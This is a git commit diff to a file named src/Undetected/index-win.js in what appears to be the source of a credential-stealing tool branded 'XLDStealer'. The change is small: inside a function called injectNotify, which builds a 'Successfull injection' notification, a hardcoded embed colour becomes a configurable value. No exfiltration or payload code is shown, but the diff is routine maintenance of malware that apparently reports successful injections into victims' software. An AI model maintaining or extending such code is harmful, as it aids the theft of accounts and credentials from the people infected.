4481af82d13c89738c847971e94e6367ad038399
Archemis <55634571+ugur014@users.noreply.github.com>
2022-04-21 19:42:28 +0000

    Update index-win.js

--- src/Undetected/index-win.js
+++ src/Undetected/index-win.js
@@ -171,7 +171,7 @@ function injectNotify() {
         "embeds": [
           {
             "title": "<:bfdnonsfw:966774651449671761> Successfull injection",
-            "color": "#E70000",
+            "color": config["embed-color"],
             "fields": fields,
             "author": {
               "name": "XLDStealer"
